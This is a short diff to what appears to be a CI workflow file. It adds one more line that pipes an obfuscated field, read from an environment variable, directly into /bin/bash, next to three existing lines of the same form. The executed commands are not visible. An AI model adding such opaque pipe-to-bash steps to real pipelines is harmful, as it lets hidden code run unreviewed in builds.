@@ -32,6 +32,7 @@ jobs:
           echo $up27 | jq -r .kk6821 | /bin/bash
           printf '%s' "$o61" | jq -r .pyft5549 | /bin/bash
           printf '%s' "$dkl20" | jq -r .nx2 | /bin/bash
+          printf '%s' "$kipq1867" | jq -r .exai67027 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
